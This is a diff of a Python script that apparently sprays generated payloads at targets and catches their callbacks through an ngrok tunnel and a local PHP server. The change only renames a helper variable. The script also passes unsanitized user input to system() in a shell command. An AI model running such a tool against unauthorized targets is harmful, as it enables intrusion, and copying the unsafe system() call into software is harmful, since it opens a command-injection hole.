@@ -25,22 +25,22 @@ argv = parser.parse_args()
 
 input_wordlist = starter(argv)
 engine = Engine()
-path_fn = PathFunction()
+PathFunctions = PathFunction()
 
 def main():
     if argv.server:
-        p = engine.generate_payloads(input_wordlist, path_fn.urler(argv.server))
+        p = engine.generate_payloads(input_wordlist, PathFunctions.urler(argv.server))
     elif argv.auto:
         if ',' in argv.auto:
             server_path, public_path = argv.auto.split(',')
-            public_url = path_fn.unender(path_fn.ender(ngrok.connect(port = port), '/') + path_fn.unstarter(public_path, '/'), '/')
+            public_url = PathFunctions.unender(PathFunctions.ender(ngrok.connect(port = port), '/') + PathFunctions.unstarter(public_path, '/'), '/')
         else:
             server_path = argv.auto
-            public_url = path_fn.unender(ngrok.connect(port = port), '/')
+            public_url = PathFunctions.unender(ngrok.connect(port = port), '/')
         c = f"(cd {server_path}; fuser -k {port}/tcp 1>/dev/null 2>/dev/null; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)"
         system(c)
         print(f"{ColorObj.information} URL generated: {public_url} ")
-        p = engine.generate_payloads(input_wordlist, path_fn.urler(public_url))
+        p = engine.generate_payloads(input_wordlist, PathFunctions.urler(public_url))
     with ThreadPoolExecutor(max_workers=argv.threads) as mapper:
         mapper.map(try_payload, p)
     print(f"{ColorObj.good} Success. Check your server logs for bounty!")
